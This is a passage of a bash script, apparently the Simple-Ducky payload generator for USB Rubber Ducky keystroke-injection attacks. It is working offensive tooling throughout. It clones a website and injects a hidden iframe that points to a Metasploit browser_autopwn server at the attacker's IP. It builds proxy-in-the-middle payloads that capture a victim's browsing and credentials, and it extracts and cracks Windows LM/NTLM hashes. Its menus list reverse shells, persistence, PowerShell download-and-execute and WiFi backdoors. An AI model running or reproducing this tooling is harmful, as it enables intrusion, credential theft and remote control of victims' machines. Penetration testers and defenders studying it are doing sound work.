		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""	
		sleep 2
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/ducky/encoder\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	else 
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/ducky/encoder\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	fi
	clear
	echo -e "\e[1;34mLet's clone a website...\e[0m"
	echo "" 
	read -p "What's the FQDN that you would like to clone (example: https://www.example.com)? " attackerfqdn
	echo -e ""
	clear
	rm index.html
	clear
	rm /var/www/index.html
	clear
	echo -e "\e[1;34mCloning $attackerfqdn and injecting an evil iframe...\e[0m"
	echo ""
	sleep 2
	wget $attackerfqdn
	echo "<iframe src="http://$attackerip:8080/duck" width="0" height="0">" >> index.html
	cp index.html /var/www/index.html
	rm index.html
	clear
	echo -e "\e[1;34mRestarting your Apache Server...\e[0m"
	echo ""
	sleep 2
	service apache2 restart
	echo ""
	echo -e "\e[1;34mDone!\e[0m"
	sleep 2
	clear
	echo -e "\e[1;34mLaunching Metasploit's Browser_Autopwn auxilary module...\e[0m" 
	echo ""
	sleep 3
	gnome-terminal -x msfcli auxiliary/server/browser_autopwn LHOST=$attackerip LPORT=$attackerport SRVPORT=8080 SRVHOST=0.0.0.0 URIPATH=/duck E &
	clear	
	read -p "Would you like to return to the main menu [y/n]? " option
	nautilus /usr/share/ducky/encoder/ &
	clear
	
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac 
}

#################################################################################
# Proxy in the Middle (PiTM) | no admin needed (Win XP/Vista/7)
#################################################################################
f_proxyinthemiddleXPVIS7(){
	clear
	echo -e "\e[1;31mDiscription:\e[0m This payload sets up a proxy server on the vicitims machine. It then launches Burpsuite and allows the attacker to see everything that the victim browses to and it will even hand over the credentials to any website visited."
	echo -e "\e[1;31mNote:\e[0m This payload does not require any admin access. Although, some corporate networks man have policies in place to block normal users from altering the proxy settings."
	echo -e "\e[1;31mTarget:\e[0m Windows Vista/7"
	echo -e "\e[1;31mAuthor:\e[0m Travis Weathers (skysploit)"
	echo ""
	echo ""
	read -p "What IP/domain would you like to use for your proxy server? " attackerip
	echo ""
	read -p "What port will you be using for your proxy server (example: 8081)? " attackerport
	echo ""
	read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec
	clear
	echo -e "\e[1;34mAlmost done. Let's set your keyboard language\e[0m"
	echo ""
	sed "/STRING/s/attackerip/$attackerip/g" /usr/share/ducky/encoder/payloads/proxyinthemiddleXPVIS7.conf > /usr/share/ducky/encoder/payload_del.txt
	sed "/STRING/s/attackerport/$attackerport/g" /usr/share/ducky/encoder/payload_del.txt > /usr/share/ducky/encoder/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/ducky/encoder/payload.txt
	rm /usr/share/ducky/encoder/payload_del.txt
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""	
		sleep 2
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/ducky/encoder\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	else 
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/ducky/encoder\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	fi
	clear
	echo -e "\e[1;34mLaunching Burp Suite...\e[0m" 
	echo ""
	sleep 2
	gnome-terminal -x java -jar -Xmx1024m /usr/bin/burpsuite.jar &
	clear
	echo -e "\e[1;34mSet the following options in Burp Suite...\e[0m" 
	echo ""
	sleep 2
	echo ""
	echo '1) Select the "Proxy" tab'
	echo ""
	echo '2) Under "Intercept" ensure that "Intercept is off"'
	echo ""
	echo '3) Select the "Options" tab under "Proxy"'
	echo ""
	echo "4) Under "Proxy Listeners" select "Add" to add a new listener"
	echo ""
	echo "5) In the "Bind to port:" radio box put $attackerport"
	echo ""
	echo "6) Click the "Specific address:" radio button and select $attackerip / the attacking machines IP address"
	echo ""
	echo "7) Select the "History" tab to view the traffic from the victims machine"
	echo ""
	read -p "Press any key to contiue" enter
	nautilus /usr/share/ducky/encoder/ &
	clear	
	read -p "Would you like to return to the main menu [y/n]? " option
	clear
	
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac 
}

#################################################################################
# Proxy in the Middle (PiTM) | no admin needed (Windows 8)
#################################################################################
f_proxyinthemiddleWIN8(){
	clear
	echo -e "\e[1;31mDiscription:\e[0m This payload sets up a proxy server on the vicitims machine. It then launches Burpsuite and allows the attacker to see everything that the victim browses to and it will even hand over the credentials to any website visited."
	echo -e "\e[1;31mNote:\e[0m This payload does not require any admin access. Although, some corporate networks man have policies in place to block normal users from altering the proxy settings."
	echo -e "\e[1;31mTarget:\e[0m Windows 8"
	echo -e "\e[1;31mAuthor:\e[0m Travis Weathers (skysploit)"
	echo ""
	echo ""
	read -p "What IP/domain would you like to use for your proxy server? " attackerip
	echo ""
	read -p "What port will you be using for your proxy server (example: 8081)? " attackerport
	echo ""
	read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec
	clear
	echo -e "\e[1;34mAlmost done. Let's set your keyboard language\e[0m"
	echo ""
	sed "/STRING/s/attackerip/$attackerip/g" /usr/share/ducky/encoder/payloads/proxyinthemiddleWIN8.conf > /usr/share/ducky/encoder/payload_del.txt
	sed "/STRING/s/attackerport/$attackerport/g" /usr/share/ducky/encoder/payload_del.txt > /usr/share/ducky/encoder/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/ducky/encoder/payload.txt
	rm /usr/share/ducky/encoder/payload_del.txt
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""	
		sleep 2
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/ducky/encoder\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	else 
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/ducky/encoder\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	fi
	clear
	echo -e "\e[1;34mLaunching Burp Suite...\e[0m" 
	echo ""
	sleep 2
	gnome-terminal -x java -jar -Xmx1024m /usr/bin/burpsuite.jar &
	clear
	echo -e "\e[1;34mSet the following options in Burp Suite...\e[0m" 
	echo ""
	sleep 2
	echo ""
	echo '1) Select the "Proxy" tab'
	echo ""
	echo '2) Under "Intercept" ensure that "Intercept is off"'
	echo ""
	echo '3) Select the "Options" tab under "Proxy"'
	echo ""
	echo '4) Under "Proxy Listeners" select "Add" to add a new listener'
	echo ""
	echo "5) In the "Bind to port:" radio box put $attackerport"
	echo ""
	echo "6) Click the "Specific address:" radio button and select $attackerip / the attacking machines IP address"
	echo ""
	echo '7) Select the "History" tab to view the traffic from the victims machine'
	echo ""
	read -p "Press any key to contiue" enter
	nautilus /usr/share/ducky/encoder/ &
	clear	
	read -p "Would you like to return to the main menu [y/n]? " option
	clear
	
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac 
}

#################################################################################
#################################################################################
#
# Misc Options (Cleanup, JAVA update & Password Hasher)
#
#################################################################################
#################################################################################

#################################################################################
# Directoy Cleanup
#################################################################################
f_cleanup(){
	clear
	echo -e "\e[1;34mRemoving old files..."
	sleep 1
	rm *.txt
	rm *.bin
	rm *.html
	clear
	echo -e "\e[1;34mDone! Returning to the main menu."
	sleep 2
	simple-ducky 
}

#################################################################################
# FTP Server Setup
#################################################################################
f_ftpsetup(){
	clear
	echo -e "\e[1;34mWhat would you like to do?\e[0m"
	echo ""
	echo "1. Initial Pure-FTPD setup"
	echo "2. Add a new user to the server"
	echo ""
	echo ""
	echo -e "\e[1;31mNote:\e[0m The initial setup is done during the installation process."
	echo ""
	read -p "Option: " option
	
	if [ "$option" == "1" ]; then
		clear
		echo -e "\e[1;34mLets start setting up your pure-ftpd server\e[0m"
		echo ""
		read -p "[-] Who would you like the primary user to be? " ftpusername
		echo ""
		echo -e "\e[1;33m[-] Configuring pure-FTPD for: $ftpusername\e[0m"
		echo ""
		sleep 3
		groupadd ftpgroup
		useradd -g ftpgroup -d /dev/null -s /etc ftpuser
		echo -e "\e[1;33m[-] Please set the password for $ftpusername.\e[0m"
		pure-pw useradd $ftpusername -u ftpuser -d /ftphome
		pure-pw mkdb
		cd /etc/pure-ftpd/auth/
		ln -s ../conf/PureDB 60pdb
		echo ""
		echo -e "\e[1;33m[-] Creating your home directory, it will reside at /ftphome/\e[0m"
		echo ""
		sleep 3
		mkdir /ftphome
		chown -R ftpuser:ftpgroup /ftphome/
		echo -e "\e[1;33m[-] Starting the FTP server.\e[0m"
		echo ""
		sleep 2
		service pure-ftpd restart
		echo ""
		echo -e "\e[1;32m[+] Done! To test your new account, in a new terminal type: ftp 127.0.0.1\e[0m"
		echo ""
		read -p "Press any key to contiue" enter	
	else
		clear
		read -p "Who would you like to add to the FTP server? " ftpusername
		pure-pw useradd $ftpusername -u ftpuser -d /ftphome
		pure-pw mkdb
		echo ""
		echo -e "\e[1;34mRestarting the FTP server.\e[0m"
		echo ""
		sleep 3
		service pure-ftpd restart
		clear
		echo -e "\e[1;34mDone! To test your new account, in a new terminal type: ftp 127.0.0.1\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
		simple-ducky
	fi
}

#################################################################################
# LM/NTLM Password Hasher
#################################################################################
f_lmntlmhasher(){
	clear
	echo -e "\e[1;31mDescription:\e[0m LM/NTLM Password Hasher..."
	echo -e "\e[1;31mNote:\e[0m If you used the 'LM/NTLM Hash Dump From Live System' payload make sure you extract the .zip files first."
	echo ""
	echo ""
	read -p "Would you like me to extract the encrypted zip files [y|n]? " extract
	echo ""
	if [ "$extract" == "y" ]; then
		read -p "What is the password for the encrypted zip files? " zippass
		echo ""
	else
		echo ""
	fi
	echo "What is the path of the SAM & SYSTEM files, make sure you specify the complete path?"
	echo ""
	read -p "[Example: /ftphome/ (default ftp directory) or /root/Desktop/] " hashpath
	clear
	if [ "$extract" == "y" ]; then
		echo -e "\e[1;34mExtracting the zip files...\e[0m"
		sleep 3
		echo ""
		cd $hashpath
		7za x SAM.zip -p$zippass
		7za x SYSTEM.zip -p$zippass
		7za x ntds.zip -p$zippass
		echo ""
	else
		echo ""
	fi
	echo -e "\e[1;34mMerging the SAM & SYSTEM files\e[0m"
	sleep 3
	echo ""
	cd $hashpath
	bkhive SYSTEM pass.txt
	samdump2 SAM pass.txt > hash.txt
	rm pass.txt
	echo ""
	clear
	echo -e "\e[1;34mDone! Here's your LM/NTLM hashes...\e[0m"
	echo ""
	cat hash.txt
	echo ""
	echo -e "\e[1;34mThe fastest way to crack these hashes is with Rainbow Tables...\e[0m"
	echo -e "\e[1;34mOn-line Rainbow Table:\e[0m http://www.md5decrypter.co.uk/ntlm-decrypt.aspx"
	echo ""
	echo -e "\e[1;34mOr if you would like, I can launch John to attempt to crack the hashes...\e[0m"
	read -p "Would you like me to launch John [y|n]? " launchjohn
	clear
	if [ "$launchjohn" == "y" ]; then
		gnome-terminal -x john hash.txt --format=nt2 &
		read -p "Would you like to return to the main menu [y/n]? " option
	else
		read -p "Would you like to return to the main menu [y/n]? " option
	fi
	
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac 
}

#################################################################################
# Site2lst Custom Wordlist Builder
#################################################################################
f_site2lst(){
	clear
	echo -e "\e[1;31mSite2Lst Custom Wordlist Builder\e[0m"
	echo "This function clones any website you would like and builds a custom wordlist based on the words extracted."
	echo -e "\e[1;31mOrignal Concept by:\e[0m PaulDotCom"
	echo -e "\e[1;31mPaulDotCom Article:\e[0m http://pauldotcom.com/2008/11/creating-custom-wordlists-for.html"
	echo -e "\e[1;31mScript Assembled by:\e[0m Travis Weathers (skysploit) | skysploit@gmail.com"
	echo ""
	echo -e "\e[1;34mWhere do you want to store the password list?\e[0m"
	echo -e "\e[1;34mDefine the full path [i.e. /root/Desktop or /usr/share/wordlists]\e[0m"
	echo ""
	read -p "Path: " newpath
	echo ""
	echo""
	echo -e "\e[1;34mWhat is the target website [Example: www.example.com]?\e[0m"
	echo""
	read -p "Target Website: " targetsite
	echo ""
	echo""
	echo -e "\e[1;34mHow many levels deep would you like to go [Example: 2 | this will clone the first two directories of the website]?\e[0m"
	echo""
	read -p "Number of directories: " directoryscan
	echo ""
	echo""
	echo -e "\e[1;34mWhat would you like to name the wordlist [Example: example.lst]?\e[0m"
	echo ""
	read -p "Wordlist name: " lstname
	echo""
	echo -e "\e[1;34mWould you like to merge your password list with the default John the Ripper list?\e[0m"
	echo""
	read -p "[y|n]: " mergelst
	clear
	mkdir $newpath/wordlist/
	cd $newpath/wordlist/
	clear
	echo -e "\e[1;34m[+] Cloning $targetsite, this may take a while...\e[0m"
	sleep 3
	echo ""
	wget -r -l $directoryscan $targetsite
	echo ""
	echo -e "\e[1;32m[+] The cloning process has finished.\e[0m"
	sleep 3
	clear
	echo -e "\e[1;34m[+] Replacing spaces with new line characters to produce a unique list...\e[0m"
	sleep 3
	grep -hr "" $targetsite/ | tr '[:space:]' '\n' | sort | uniq > wordlist.lst
	echo ""
	echo ""
	echo -e "\e[1;34m[+] Removing odd characters (mainly HTML tags)...\e[0m"
	sleep 3
	egrep -v '('\,'|'\;'|'\}'|'\{'|'\<'|'\>'|'\:'|'\='|'\"'|'\/'|'\/'|'\['|'\]')' wordlist.lst | sort -u > wordlist.clean.lst
	sed 's/[)(]//g' wordlist.clean.lst > wordlist.clean2.lst
	if [ "$mergelst" == "y" ]; then
		echo ""
		echo ""
		echo -e "\e[1;34m[+] Merging our wordlist with the default John the Ripper list....\e[0m"
		sleep 3
		cp /usr/share/john/password.lst password.lst
		cat password.lst >> wordlist.clean2.lst
		rm password.lst
		echo ""
		echo ""
	else
		echo ""
		echo ""
	fi
	echo -e "\e[1;34m[+] Applying some rules and finializing the output...\e[0m"
	sleep 3
	echo""
	john --wordlist=wordlist.clean2.lst --rules --stdout | uniq > $lstname
	echo ""
	echo -e "\e[1;34m[+] Cleaning up our mess...\e[0m"
	sleep 3
	rm wordlist.clean2.lst
	rm wordlist.clean.lst
	rm wordlist.lst
	rm -rf $targetsite/
	echo ""
	echo ""
	echo -e "\e[1;32m[+] Done! your new list is located here: $newpath/wordlist/$lstname\e[0m"
	sleep 3
	nautilus $newpath/wordlist/ &&
	echo ""
	echo ""
	read -p "Press any key to contiue" enter
	clear
	f_mainmenu
}

#################################################################################
# Dependency Installer
#################################################################################
f_installer(){
clear
echo -e "\e[1;34m[*] Performing an APT Update prior to installing dependencies...\e[0m\n"
sleep 3
apt-get update
echo ""
echo -e "\e[1;32m[+] APT Update complete...\e[0m"
sleep 3
clear

echo -e "\e[1;34m[*] Please wait while I install some dependencies...\e[0m\n"
sleep 3
updatedb
mkdir /tmp/simple-ducky/
echo ""

	machine=$(cat /etc/issue)
	if [ "$machine" == "Kali GNU/Linux 1.0 \n \l" ]; then
		echo -e "\n\e[1;34m[*] I see that you are using Kali-Linux. This will only take a few moments...\e[0m"
		echo ""
		sleep 3
		f_kaliinstall
	else
		f_otherdebian
	fi

}

########################################################
# Kali Install
########################################################
f_kaliinstall(){
	reqs="pure-ftpd dfu-programmer burpsuite"
	for i in $reqs; do
		dpkg -s "$i" &> /tmp/simple-ducky/$i-install.txt
		isinstalled=$(cat /tmp/simple-ducky/$i-install.txt | grep -o "Status: install ok installed")
		if [ ! -e /usr/bin/$i ] && [ ! -e /usr/sbin/$i ] && [ ! -e /usr/local/sbin/$i ] && [ ! -e /usr/local/bin/$i ] && [ -z "$isinstalled" ]; then
				echo -e "\e[1;33m[-] It doesn't appear that $i is installed on your system. Installing it now...\e[0m"
				echo ""
			if [ ! -z $(apt-get install -y "$i" | grep -o "E: Couldn") ]; then
				echo -e "\e[1;31m[-] I had a hard time installing $i from the Kali-Linux repository.\e[0m"
				touch /tmp/simple-ducky/$i-fail
			else
				dpkg -s "$i" &> /tmp/simple-ducky/$i-install.txt
				isinstalled=$(cat /tmp/simple-ducky/$i-install.txt | grep -o "Status: install ok installed")				
				if [ ! -z "$isinstalled" ]; then
					update=1
					echo -e "\e[1;32m[+] Good news, $i installed without any issues.\e[0m"
					echo ""
					sleep 2
				else
					echo ""
					echo -e "\e[1;31m[!] It doesn't appear that I will be able to install $i right now.\e[0m"
					echo ""
					sleep 2
				fi
			fi
		else
			echo -e "\e[1;32m[+] $i is already installed on your system, moving on...\e[0m"
			echo ""
			sleep 2
		fi
	done
f_java

}

########################################################
# Other Debian Install
########################################################
f_otherdebian(){
	reqs="pure-ftpd file-roller dfu-programmer apache2 gnome-terminal burpsuite git wget netcat p7zip-full nautilus"
	for i in $reqs; do
		dpkg -s "$i" &> /tmp/simple-ducky/$i-install.txt
		isinstalled=$(cat /tmp/simple-ducky/$i-install.txt | grep -o "Status: install ok installed")
		if [ ! -e /usr/bin/$i ] && [ ! -e /usr/sbin/$i ] && [ ! -e /usr/local/sbin/$i ] && [ ! -e /usr/local/bin/$i ] && [ -z "$isinstalled" ]; then
				echo -e "\e[1;33m[-] It doesn't appear that $i is installed on your system. Installing it now...\e[0m"
				echo ""
			if [ ! -z $(apt-get install -y "$i" | grep -o "E: Couldn") ]; then
				echo -e "\e[1;31m[-] I had a hard time installing $i from the Kali-Linux repository.\e[0m"
				touch /tmp/simple-ducky/$i-fail.txt
			else
				dpkg -s "$i" &> /tmp/simple-ducky/$i-install.txt
				isinstalled=$(cat /tmp/simple-ducky/$i-install.txt | grep -o "Status: install ok installed")				
				if [ ! -z "$isinstalled" ]; then
					update=1
					echo -e "\e[1;32m[+] Good news, $i installed without any issues.\e[0m"
					echo ""
					sleep 2
				else
					echo ""
					echo -e "\e[1;31m[!] It doesn't appear that I will be able to install $i right now.\e[0m"
					echo ""
					sleep 2
				fi
			fi
		else
			echo -e "\e[1;32m[+] $i is already installed on your system, moving on...\e[0m"
			echo ""
			sleep 2
		fi
	done

f_metasploit
}

########################################################
# Metasploit
########################################################	
f_metasploit(){
clear
echo -e "\e[1;34m[*] Checking to see if Metasploit is installed...\e[0m\n"
if [ ! -e /usr/bin/msfconsole ] && [ ! -e /usr/sbin/msfconsole ] && [ ! -e /usr/local/sbin/msfconsole ] && [ ! -e /usr/local/bin/msfconsole ]; then
	update=1
	echo -e "\n\e[1;34m[*] It doesn't appear that Metasploit is installed on your system. Installing it now...\e[0m"
	echo ""
	machine=$(uname -m)
	if [ "$machine" == "x86_64" ]; then
		wget http://downloads.metasploit.com/data/releases/metasploit-latest-linux-x64-installer.run -O /tmp/simple-ducky/metasploit-latest-linux-x64-installer.run
		echo -e "\n\e[1;33m[*] Launching the Metasploit installer. Select all the defaults and DONT launch the web UI...\e[0m"
		echo ""
		sleep 3
		chmod 755 /tmp/simple-ducky/metasploit-latest-linux-x64-installer.run
		/tmp/simple-ducky/metasploit-latest-linux-x64-installer.run
	else
		wget http://downloads.metasploit.com/data/releases/metasploit-latest-linux-installer.run -O /tmp/simple-ducky/metasploit-latest-linux-installer.run
		echo -e "\n\e[1;33m[*] Launching the Metasploit installer. Select all the defaults and DONT launch the web UI...\e[0m"
		echo ""
		sleep 3
		chmod 755 /tmp/simple-ducky/metasploit-latest-linux-installer.run
		/tmp/simple-ducky/metasploit-latest-linux-installer.run
	fi

	cd /usr/bin
	msfprogs="msfconsole msfupdate msfencode msfpayload"
	for z in $msfprogs; do
		if [ ! -e /usr/bin/$z ]; then
			ln -f -s /usr/local/bin/$z $z
		fi
	done
fi
echo -e "\e[1;32m[+] Good news, Metasploit installed without any issues.\e[0m"
echo ""
sleep 2

f_setoolkit
}

########################################################
# SE-Toolkit
########################################################	
f_setoolkit(){
clear
echo -e "\e[1;34m[+] Checking to see if the Social Engineering Toolkit is installed...\e[0m\n"
echo ""
sleep 4
	dpkg -s "set" &> /tmp/simple-ducky/set-install.txt
	setoolkit=$(cat /tmp/simple-ducky/set-install.txt | grep -o "Status: install ok installed")
	if [ "$setoolkit" == "Status: install ok installed" ]; then
	echo -e "\e[1;32m[+]  The SE-Toolkit is already installed on your system, moving on...\e[0m"
		echo ""
		sleep 4
	else			
		echo -e "\e[1;33m[-] It doesn't appear that the SE-Toolkit is installed on your system. Installing it now...\e[0m"
		echo -e ""
		sleep 3
		git clone https://github.com/trustedsec/social-engineer-toolkit/ /tmp/simple-ducky/set/
		chmod 755 /tmp/simple-ducky/set/setup.py
		python /tmp/simple-ducky/set/setup.py install
		echo ""
		echo -e "\e[1;32m[+] Good news, the SE-Toolkit installed without any issues.\e[0m"
		echo ""
		sleep 2
	fi


bsuite=$(cat /tmp/simple-ducky/burpsuite-install.txt | grep -o "is not installed" )
	if [ "$bsuite" == "is not installed" ]; then
		f_burpsuite
	else
		f_java
fi
}

########################################################
# Burpsuite
#######################################################
f_burpsuite(){
	clear
	echo -e "\e[1;34mTrying a different approach to install Burpsuite...\e[0m\n"
	echo ""
	sleep 3
	mkdir /usr/share/burpsuite/
	wget http://portswigger.net/burp/burpsuite_free_v1.5.jar -O /usr/share/burpsuite/burpsuite.jar
	chmod 755 /usr/share/burpsuite/burpsuite.jar
	ln -s /usr/share/burpsuite/burpsuite.jar /usr/bin/burpsuite.jar
	echo ""
	echo -e "\e[1;32m[+] Good news, Burpsuite installed without any issues.\e[0m"
	sleep 3
	clear
f_java
}

########################################################
# JavaInstall
########################################################
f_java(){
clear
echo -e "\e[1;34m[+] Checking your JDK version, I will update it if needed...\e[0m\n"
echo ""
sleep 4
	java -version &> /tmp/simple-ducky/java-version.txt
	javainstall=$(cat /tmp/simple-ducky/java-version.txt | grep -o "1.7.0")
	if [ "$javainstall" == "1.7.0" ]; then
		echo -e "\e[1;32m[+] It looks like your JDK is up to date, moving on..."
		sleep 4
	else			
		echo -e "\e[1;33m[+] It looks like we need to update JDK to version 1.7.0\e[0m"
		echo -e ""
		sleep 3
		apt-get install -y openjdk-7-jre-headless
		echo ""
		echo -e "\e[1;33m[*] When prompted select the option for: '...java-7-openjdk...'\e[0m"
		echo ""
		sleep 4
		update-alternatives --config java
		echo ""
		echo -e "\e[1;32m[+] Your new JDK version is...\e[0m"
		echo ""
		java -version
		sleep 5
		clear
	fi
f_cleanupexit

}
#################################################################################
# Cleanup and Return to the Main Menu
#################################################################################
f_cleanupexit(){
	echo ""
	echo -e "\e[1;32m[+] The installation process is complete! Returning to the main menu...\e[0m"
	echo ""
	sleep 5
	rm -rf /tmp/simple-ducky/
	clear
	f_mainmenu
}

#################################################################################
#################################################################################
#
# Menu Section
#
#################################################################################
#################################################################################

#################################################################################
# Main Menu - Banner
#################################################################################
f_banner(){
	clear
	echo -e "\e[1;31mSimple-Ducky Payload Generator\e[0m "
	echo -e "Get your USB Rubber Ducky @ http://hakshop.myshopify.com/"
	echo -e "If you would like to submit your payload send it to skysploit@gmail.com"
	echo -e "\e[1;31mHak5 forums:\e[0m http://forums.hak5.org/index.php?/forum/56-usb-rubber-ducky/"
	echo -e "\e[1;31mSimple-Ducky:\e[0m https://code.google.com/p/simple-ducky-payload-generator/"
	echo -e "\e[1;31mDucky-Decode:\e[0m https://code.google.com/p/ducky-decode/"
	echo -e "\e[1;31mAuthor:\e[0m Travis Weathers (skysploit) | skysploit@gmail.com"
	echo -e "\e[1;31mEncoder Version:\e[0m v2.6"
	echo -e "\e[1;31mEncoder by:\e[0m ApacheTech & Midnitesnake"
	echo -e "\e[1;31mSimple-Ducky Version:\e[0m v1.1.0 \e[1;31mLast Modified:\e[0m 17 May 2013"
	echo -e ""
}

#################################################################################
# Main Menu - Options
#################################################################################
f_mainmenu(){

f_banner
	echo -e "\e[1;34mWhere would you like to start?\e[0m"
	echo ""
	echo "1. Windows Reverse Shell Payloads"
	echo "2. WiFi Attacks"
	echo "3. Password Attacks"
	echo "4. Linux & OS X Payloads"
	echo "5. Forced Phishing & Web Attacks"
	echo "6. Clean up the Encoder directory"	
	echo "7. Dependency Checker"
	echo "8. FTP Server Setup/User Add"
	echo "9. LM/NTLM Password Hasher"
	echo "10.Site2lst Custom Wordlist Builder"
	echo "11.Quit"
	echo ""
	read -p "Option: " option

	case $option in
	1) f_windowsshellmenu ;;
	2) f_wifimenu ;;
	3) f_passwordmenu ;;
	4) f_linuxosxmenu ;;
	5) f_forcedphishmenu ;;
	6) f_cleanup ;;
	7) f_installer ;;
	8) f_ftpsetup ;;
	9) f_lmntlmhasher ;;
	10) f_site2lst ;;
	11) clear;exit ;;
	*) clear;exit ;;
	esac

}

#################################################################################
# Windows Reverse Shell - Banner
#################################################################################
f_winshellbanner(){
	clear
	echo -e "\e[1;31mSimple-Ducky Payload Generator\e[0m "
	echo -e "Windows reverse shell payloads of various types"
	echo -e "If you would like to contribute your payload contact the author at skysploit@gmail.com"
	echo -e "\e[1;31mAuthor:\e[0m Travis Weathers (skysploit)"
	echo -e ""
}

#################################################################################
# Windows Reverse Shell - Options
#################################################################################
f_windowsshellmenu(){

f_winshellbanner
	echo -e "\e[1;34mWhat payload would you like to use?\e[0m"
	echo ""
	echo "1.  Persistence Reverse Shell w/UAC (Win Vista/7)"
	echo "2.  Persistence Reverse Shell w/o UAC (Win Vista/7)"
	echo "3.  Persistence Reverse Shell w/UAC (Win 8)"
	echo "4.  Persistence Reverse Shell w/o UAC (Win 8)"
	echo "5.  Windows Reverse Shell (No Download|W2K/XP)"
	echo "6.  Windows Reverse Shell w/UAC (No Download|Win Vista/7)"
	echo "7.  Windows Reverse Shell w/o UAC (No Download|Win Vista/7)"
	echo "8.  Windows Reverse Shell w/UAC (No Download|Win 8)"
	echo "9.  Windows Reverse Shell w/o UAC (No Download|Win 8)"
	echo "10. Powershell Download & Execute (User Priv Shell|Win Vista/7)"
	echo "11. Powershell Download & Execute w/UAC (Admin Priv Shell|Win Vista/7)"
	echo "12. Powershell Download & Execute w/o UAC (Admin Priv Shell|Win Vista/7)"
	echo "13. Powershell Download & Execute (User Priv Shell|Win 8)"
	echo "14. Powershell Download & Execute w/UAC (Admin Priv Shell|Win 8)"
	echo "15. Powershell Download & Execute w/UAC (Admin Priv Shell|Win 8)"
	echo "16. Return to Main Menu"
	echo "17. Quit"
	echo ""
	read -p "Option: " option

	case $option in
	1) f_persistenceVIS7uac ;;
	2) f_persistenceVIS7nouac ;;
	3) f_persistenceWIN8uac ;;
	4) f_persistenceWIN8nouac ;;
	5) f_windowsrevW2KXP ;;
	6) f_windowsrevVIS7uac ;;
	7) f_windowsrevVIS7nouac ;;	
	8) f_windowsrevWIN8uac ;;
	9) f_windowsrevWIN8nouac ;;
	10) f_powershellVIS7 ;;
	11) f_powershellVIS7admuac ;;
	12) f_powershellVIS7admnouac ;;
	13) f_powershellWIN8 ;;
	14) f_powershellWIN8admuac ;;
	15) f_powershellWIN8admnouac ;;
	16) f_mainmenu ;;
	17) clear;exit ;;
	 *) clear;exit ;;
	esac
}

#################################################################################
# Wifi Attacks - Banner
#################################################################################
f_wifibanner(){
	clear
	echo -e "\e[1;31mSimple-Ducky Payload Generator\e[0m "
	echo -e "Some of these payloads go great with the WiFi Pineapple"
	echo -e "If you would like to contribute your payload contact the author at skysploit@gmail.com"
	echo -e "\e[1;31mAuthor:\e[0m Travis Weathers (skysploit)"
	echo -e ""
}

#################################################################################
# Wifi Attacks - Options
################################################################################
f_wifimenu(){

f_wifibanner
	echo -e "\e[1;34mWhat payload would you like to use?\e[0m"
	echo ""
	echo "1. WiFi Backdoor w/UAC (Win Vista/7)"
	echo "2. WiFi Backdoor w/o UAC (Win Vista/7)"
	echo "3. WiFi Backdoor w/UAC (Win 8)"
	echo "4. WiFi Backdoor w/o UAC (Win 8)"
	echo "5. WiFi Autoconnect w/UAC (Designed for the WiFi Pineapple | Win Vista/7)"
	echo "6. WiFi Autoconnect w/o UAC (Designed for the WiFi Pineapple | Win Vista/7)"
	echo "7. WiFi Autoconnect w/UAC (Designed for the WiFi Pineapple | Win 8)"
